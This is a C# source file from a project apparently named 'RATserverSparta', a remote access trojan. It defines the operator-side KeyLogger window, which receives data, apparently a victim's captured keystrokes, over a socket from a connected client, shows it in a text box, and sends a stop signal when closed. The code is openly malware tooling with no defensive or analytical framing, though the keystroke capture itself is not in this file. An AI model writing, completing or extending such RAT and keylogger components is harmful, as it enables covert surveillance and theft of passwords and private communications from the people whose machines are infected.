using RATserverSparta.Client;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolTip;

namespace RATserverSparta.Tools
{
    public partial class KeyLogger : Form
    {
        private Client.Client ClientClassInstance;
        private Client.SocketSend Data;
        public KeyLogger(Client.Client ClientClassInstance, System.Net.Sockets.Socket ClientSocket)
        {
            InitializeComponent();
            this.ClientClassInstance = ClientClassInstance;
            this.Data = new SocketSend(ClientSocket);
        }

        private void KeyLogger_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            ClientClassInstance.MessageEvent += UpdatingMessages;
            FormClosing += OnClose;
            KeyPreview = true;
        }
        private void OnClose(object sender, EventArgs e)
        {
            this.Data.Send(Encoding.ASCII.GetBytes("\0\0"), 1);
            ClientClassInstance.MessageEvent -= UpdatingMessages;
        }

        private void UpdatingMessages(byte[] buffer)
        {
            string a = Encoding.UTF8.GetString(buffer);
            this.Invoke((MethodInvoker)delegate
            {
                databox.Text += a;
            });
        }
    }
}
